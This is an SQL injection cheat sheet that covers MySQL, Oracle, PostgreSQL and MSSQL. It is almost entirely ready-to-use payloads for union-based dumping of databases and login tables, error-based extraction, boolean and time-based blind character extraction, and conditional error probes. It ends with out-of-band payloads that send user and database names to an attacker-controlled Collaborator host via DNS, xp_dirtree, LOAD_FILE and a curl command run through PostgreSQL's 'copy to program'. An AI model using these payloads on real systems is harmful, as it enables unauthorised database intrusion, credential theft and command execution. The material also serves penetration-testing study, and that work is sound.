# SQL injection cheat sheet
## 1. Union-Based Injection Payloads Matrix

When executing group-concatenation or multi-row dumps across different engines, the function names and metadata views change completely.

### MySQL (Added to complete your set)

- **To Find Column Count:** `ORDER+BY+1`
    
- **To Find Vulnerable Column:** `UNION+SELECT+1,version(),3,4,5-- -` _(or use `#` or `--+`)_
    
- **To Find Hidden Columns:** `+AND+1=0`
    
- **To Find All Databases:** `(SELECT+GROUP_CONCAT(schema_name)+FROM+INFORMATION_SCHEMA.SCHEMATA)`
    
- **To Find Table Name:** `(SELECT+GROUP_CONCAT(table_name)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=DATABASE())`
    
- **To Find Column Name:** `(SELECT+GROUP_CONCAT(column_name)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME='login')`
    
- **To Dump Data:** `(SELECT+GROUP_CONCAT(user_name)+FROM+gfcollege.login)`
### Oracle

Oracle requires a `FROM` clause for everything, requires uppercase strings in standard metadata queries, and uses string concatenation (`||`) rather than a function to join strings.

- **To Find Column:** `ORDER+BY+1`
    
- **To Find Vulnerable Column:** `UNION+SELECT+NULL,NULL,NULL+FROM+dual--` _(Note: Columns must match the target's exact data types—use `NULL` to find them safely first)._
    
- **To Find Hidden Columns:** `+AND+1=0`
    
- **To Find All Databases (Schemas):** `(SELECT+LISTAGG(username,'_')+WITHIN+GROUP+(ORDER+BY+username)+FROM+all_users)`
    
- **To Find Table Name:** `(SELECT+LISTAGG(table_name,'_')+WITHIN+GROUP+(ORDER+BY+table_name)+FROM+all_tables+WHERE+owner='CURRENT_SCHEMA')`
    
- **To Find Column Name:** `(SELECT+LISTAGG(column_name,'_')+WITHIN+GROUP+(ORDER+BY+column_name)+FROM+all_tab_columns+WHERE+table_name='LOGIN')`
    
- **To Dump Data:** `(SELECT+LISTAGG(user_name,'_')+WITHIN+GROUP+(ORDER+BY+user_name)+FROM+gfcollege.login)`
    

### PostgreSQL

PostgreSQL does not require a dummy table and utilizes `string_agg()` for concatenation across multiple rows.

- **To Find Column:** `ORDER+BY+1`
    
- **To Find Vulnerable Column:** `UNION+SELECT+1,version(),3,4,5`
    
- **To Find Hidden Columns:** `+AND+1=0`
    
- **To Find All Databases:** `(SELECT+string_agg(datname,',')+FROM+pg_database)`
    
- **To Find Table Name:** `(SELECT+string_agg(table_name,',')+FROM+information_schema.tables+WHERE+table_schema=current_schema())`
    
- **To Find Column Name:** `(SELECT+string_agg(column_name,',')+FROM+information_schema.columns+WHERE+table_name='login')`
    
- **To Dump Data:** `(SELECT+string_agg(user_name,',')+FROM+gfcollege.login)`
    

### Microsoft SQL Server (MSSQL)

Older versions of MSSQL used complex XML paths for row aggregation, but modern versions (2017+) utilize `STRING_AGG()`.

- **To Find Column:** `ORDER+BY+1`
    
- **To Find Vulnerable Column:** `UNION+SELECT+1,@@version,3,4,5`
    
- **To Find Hidden Columns:** `+AND+1=0`
    
- **To Find All Databases:** `(SELECT+STRING_AGG(name,',')+FROM+master.dbo.sysdatabases)`
    
- **To Find Table Name:** `(SELECT+STRING_AGG(table_name,',')+FROM+information_schema.tables+WHERE+table_catalog=DB_NAME())`
    
- **To Find Column Name:** `(SELECT+STRING_AGG(column_name,',')+FROM+information_schema.columns+WHERE+table_name='login')`
    
- **To Dump Data:** `(SELECT+STRING_AGG(user_name,',')+FROM+gfcollege..login)`
    

## 2. Row Aggregation & Multi-Column Concatenation Cheatsheet

In your MySQL notes, you used `GROUP_CONCAT(id, 0x3a3a, user, 0x3a3a, password)` to pull multiple rows and columns in a single field. Here is how that translates across platforms when you need to condense entire datasets into one display block.

|**Database**|**Multi-Row Aggregation Function**|**Multi-Column Separator Syntax (using : as a delimiter)**|
|---|---|---|
|**MySQL**|`GROUP_CONCAT(col)`|`CONCAT(col1, ':', col2)`|
|**Oracle**|`LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)`|`col1 \| ':' \| col2`|
|**PostgreSQL**|`string_agg(col, ',')`|`col1 \| ':' \| col2` or `CONCAT(col1, ':', col2)`|
|**SQL Server**|`STRING_AGG(col, ',')`|`col1 + ':' + col2` or `CONCAT(col1, ':', col2)`|

## 3. Order-By SQL Injection Notes

When an injection point is located directly inside an `ORDER BY` clause (e.g., `SELECT * FROM products ORDER BY $_GET['sort']`), standard `UNION SELECT` statements often fail depending on the engine structure. You generally use **conditional expressions** or **blanket true/false checks** to verify execution behaviors.

### Structural Verification Tests for `ORDER BY` points:

- **MySQL:** `ORDER BY (SELECT IF(1=1, 1, (SELECT table_name FROM information_schema.tables)))` _(Triggers an error if false due to multi-row evaluation)._
    
- **PostgreSQL:** `ORDER BY (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1/0) END)` _(Triggers a division-by-zero error conditionally)._
    
- **Oracle:** `ORDER BY (CASE WHEN (1=1) THEN 1 ELSE TO_NUMBER('ERROR') END)` _(Triggers a type-conversion error conditionally)._
    
- **SQL Server:** `ORDER BY (CASE WHEN (1=1) THEN 1 ELSE 1/0 END)` _(Triggers a division-by-zero error conditionally)._

## 2. Upgraded Error-Based Payloads Matrix (With Single-Row Iteration)

Instead of grabbing all tables at once (which truncates), these payloads use an offset/limit mechanism to leak exactly one table or schema name at a time securely.

| **Database**   | **Extraction Payload (Single-Row Safe)**                                                                                                                                  | **How to Iterate to the Next Row**                                                      |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------- |
| **MySQL**      | `' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- -`                                     | Change `LIMIT 0,1` to `LIMIT 1,1`, `LIMIT 2,1`, etc.                                    |
| **Oracle**     | `' AND 1=CAST((SELECT table_name FROM (SELECT table_name, rownum AS rn FROM all_tables WHERE owner=user) WHERE rn=1) AS INT)--`                                           | Change `WHERE rn=1` to `WHERE rn=2`, `WHERE rn=3`, etc.                                 |
| **PostgreSQL** | `' AND 1=CAST((SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() LIMIT 1 OFFSET 0) AS INT)--`                                          | Change `OFFSET 0` to `OFFSET 1`, `OFFSET 2`, etc.                                       |
| **SQL Server** | `' AND 1=CAST((SELECT TOP 1 table_name FROM (SELECT TOP 1 table_name FROM information_schema.tables ORDER BY table_name ASC) AS Tech ORDER BY table_name DESC) AS INT)--` | (MSSQL requires nested `TOP` sorting queries to iterate rows without an offset clause). |

## 3. Upgraded Boolean-Based Blind Matrix (Single-Row Character Hunt)

In the wild, you do not know if the table is named `users`. You must find the metadata table names character-by-character. These queries target row #1 (`OFFSET 0` or `LIMIT 0,1`) and check if its first character is `'a'`.

### MySQL

- **Discovering Table Names:** `' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='a'-- -`
    
- **Discovering Column Names:** `' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='TARGET_TABLE' LIMIT 0,1),1,1)='a'-- -`
    

### Oracle

- **Discovering Table Names:** `' AND SUBSTR((SELECT table_name FROM (SELECT table_name, rownum AS rn FROM all_tables WHERE owner=user) WHERE rn=1),1,1)='A'--`
    
- **Discovering Column Names:** `' AND SUBSTR((SELECT column_name FROM (SELECT column_name, rownum AS rn FROM all_tab_columns WHERE table_name='TARGET_TABLE') WHERE rn=1),1,1)='A'--`
    

### PostgreSQL

- **Discovering Table Names:** `' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() LIMIT 1 OFFSET 0),1,1)='a'--`
    
- **Discovering Column Names:** `' AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='target_table' LIMIT 1 OFFSET 0),1,1)='a'--`
    

### SQL Server (MSSQL)

- **Discovering Table Names:** `' AND SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1)='a'--`
    

## 4. Upgraded Time-Based Delay Matrix (Single-Row Character Hunt)

If the page response never changes, use these queries to automate row extraction via time measurement. These examples check if the first letter of the first discovered table name is `'a'`.

### MySQL

SQL

```
' AND IF(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='a', SLEEP(5), 0)-- -
```

### Oracle

SQL

```
' AND 1=(SELECT CASE WHEN (SUBSTR((SELECT table_name FROM (SELECT table_name, rownum AS rn FROM all_tables WHERE owner=user) WHERE rn=1),1,1)='A') THEN dbms_pipe.receive_message('a',5) ELSE 1 END FROM dual)--
```

### PostgreSQL

SQL

```
' AND (SELECT CASE WHEN (SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() LIMIT 1 OFFSET 0),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

### Microsoft SQL Server (MSSQL)

SQL

```
'; IF (SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1)='a') WAITFOR DELAY '0:0:5'--
```

## 5. Complete Summary Cheat Sheet (For Scripting & Python Automation)

When writing custom automated exploitation scripts (`session.post` structures), keep this exact syntax mapping handy for loop configurations.

| **Database**   | **Substring Function**     | **Length Function** | **Single-Row Isolation Clause**                      |
| -------------- | -------------------------- | ------------------- | ---------------------------------------------------- |
| **MySQL**      | `SUBSTRING(str, pos, len)` | `LENGTH(str)`       | `LIMIT X, 1`                                         |
| **Oracle**     | `SUBSTR(str, pos, len)`    | `LENGTH(str)`       | `WHERE rn = X` (via nested rownum subquery)          |
| **PostgreSQL** | `SUBSTRING(str, pos, len)` | `LENGTH(str)`       | `LIMIT 1 OFFSET X`                                   |
| **SQL Server** | `SUBSTRING(str, pos, len)` | `LEN(str)`          | `SELECT TOP 1 ... WHERE x NOT IN (SELECT TOP X ...)` |
## 6. Conditional Error Probes (True vs. False)

Use these when you cannot see any database output on the page, but the web application responds with a generic `200 OK` for a true condition and a `500 Internal Server Error` for a false condition. These payloads are **completely table-agnostic** because they force mathematical or type-casting errors inside conditional blocks.

### Oracle

Oracle evaluates expressions sequentially. We use conditional `CASE` statements to trigger a division-by-zero (`1/0`) or type-cast failure.

- **True Condition (No Error):** `' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE TO_NUMBER('ERROR') END FROM dual)=1--`
    
- **False Condition (Triggers Error):** `' AND (SELECT CASE WHEN (1=2) THEN 1 ELSE TO_NUMBER('ERROR') END FROM dual)=1--`
    

### PostgreSQL

PostgreSQL allows inline queries anywhere. We force a conditional division by zero.

- **True Condition (No Error):** `' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END)--`
    
- **False Condition (Triggers Error):** `' AND 1=(SELECT CASE WHEN (1=2) THEN 1 ELSE 1/(SELECT 0) END)--`
    

### MySQL

MySQL handles errors a bit more leniently, but you can force a runtime evaluation failure using an invalid subquery structure or a verbose mathematical overflow error like `EXP(710)`.

- **True Condition (No Error):** `' AND IF(1=1, 1, (SELECT table_name FROM information_schema.tables))=1-- -`
    
- **False Condition (Triggers Error):** `' AND IF(1=2, 1, (SELECT table_name FROM information_schema.tables))=1-- -` _(Triggers error due to subquery returning multiple rows)_
    

### Microsoft SQL Server (MSSQL)

MSSQL easily breaks on conditional division-by-zero runtime errors.

- **True Condition (No Error):** `' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)--`
    
- **False Condition (Triggers Error):** `' AND 1=(SELECT CASE WHEN (1=2) THEN 1 ELSE 1/0 END)--`
    

## 7. Visible Error Data Extraction

When an application displays database-generated error messages directly on screen (like a stack trace), you can trick the engine into throwing a type-mismatch error that contains your target metadata string.

### Oracle

- **Extract Current User:** `' AND 1=CAST((SELECT user FROM dual) AS INT)--`
    
- **Extract Database Name:** `' AND 1=CAST((SELECT global_name FROM global_name) AS INT)--`
    

### PostgreSQL

- **Extract Current User:** `' AND 1=CAST((SELECT current_user) AS INT)--`
    
- **Extract Database Name:** `' AND 1=CAST((SELECT current_database()) AS INT)--`
    

### MySQL

- **Extract Current User:** `' AND EXTRACTVALUE(1, CONCAT(0x3a, user()))-- -`
    
- **Extract Database Name:** `' AND EXTRACTVALUE(1, CONCAT(0x3a, database()))-- -`
    

### Microsoft SQL Server (MSSQL)

- **Extract Current User:** `' AND 1=CAST(user_name() AS INT)--`
    
- **Extract Database Name:** `' AND 1=CAST(db_name() AS INT)--`
    

## 8. Conditional Time Delays with Data Retrieval

When the page output remains completely static (no visible error shifts, no text changes), you must extract data character-by-character by measuring how long the server takes to respond. These examples dynamically target the **current database name**.

### Oracle

- **Check if first character is 'a':**
    
    SQL
    
    ```
    ' AND 1=(SELECT CASE WHEN (SUBSTR(global_name,1,1)='a') THEN dbms_pipe.receive_message('a',5) ELSE 1 END FROM global_name)--
    ```
    

### PostgreSQL

- **Check if first character is 'a':**
    
    SQL
    
    ```
    ' AND (SELECT CASE WHEN (SUBSTRING(current_database(),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
    ```
    

### MySQL

- **Check if first character is 'a':**
    
    SQL
    
    ```
    ' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0)-- -
    ```
    

### Microsoft SQL Server (MSSQL)

- **Check if first character is 'a':**
    
    SQL
    
    ```
    '; IF (SUBSTRING(db_name(),1,1)='a') WAITFOR DELAY '0:0:5'--
    ```
    

## 9. Out-of-Band (OAST) DNS Lookups & Data Exfiltration

Out-of-band injection instructs the database server to initiate a network lookup (like a DNS request) to an external server you control (e.g., a Burp Collaborator domain). To make this dynamic "in the wild," we concatenate system functions directly into the subdomain prefix.

### Oracle

Oracle uses built-in XML or utility packages to force network resolution.

- **Basic DNS Lookup Interaction:**
    
    SQL
    
    ```
    ' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://YOUR-COLLABORATOR-ID.oastify.com/">]%20%ext;');),'/l') FROM dual--
    ```
    
- **Dynamic Data Exfiltration (Exfiltrating Current User Name):**
    
    SQL
    
    ```
    ' UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://'||(SELECT user FROM dual)||'.YOUR-COLLABORATOR-ID.oastify.com/">]%20%ext;');),'/l') FROM dual--
    ```
    

### Microsoft SQL Server (MSSQL)

MSSQL relies on the `xp_dirtree` master extended stored procedure to trigger a network lookup over a UNC path.

- **Basic DNS Lookup Interaction:**
    
    SQL
    
    ```
    '; exec master..xp_dirtree '\\YOUR-COLLABORATOR-ID.oastify.com\a'--
    ```
    
- **Dynamic Data Exfiltration (Exfiltrating Current Database Name):**
    
    SQL
    
    ```
    '; declare @db varchar(1024); set @db=(SELECT db_name()); exec('master..xp_dirtree "\\' + @db + '.YOUR-COLLABORATOR-ID.oastify.com\a"')--
    ```
    

### PostgreSQL

PostgreSQL can handle file reads or specific extensions to invoke lookups. The `copy ... to program` approach functions effectively if the server has administrative privileges.

- **Basic DNS Lookup Interaction:**
    
    SQL
    
    ```
    '; copy (SELECT '') to program 'nslookup YOUR-COLLABORATOR-ID.oastify.com'--
    ```
    
- **Dynamic Data Exfiltration (Exfiltrating Current User Name):**
    
    SQL
    
    ```
    '; drop table if exists external_dump; create table external_dump(cmd text); copy external_dump from program 'curl http://`whoami`.YOUR-COLLABORATOR-ID.oastify.com/'--
    ```
    

### MySQL

MySQL triggers DNS interactions exclusively on Windows environments via network file path functions like `LOAD_FILE`.

- **Basic DNS Lookup Interaction:**
    
    SQL
    
    ```
    ' AND LOAD_FILE('\\\\YOUR-COLLABORATOR-ID.oastify.com\\a')-- -
    ```
    
- **Dynamic Data Exfiltration (Exfiltrating Database Version):**
    
    SQL
    
    ```
    ' AND LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.YOUR-COLLABORATOR-ID.oastify.com\\a'))-- -
    ```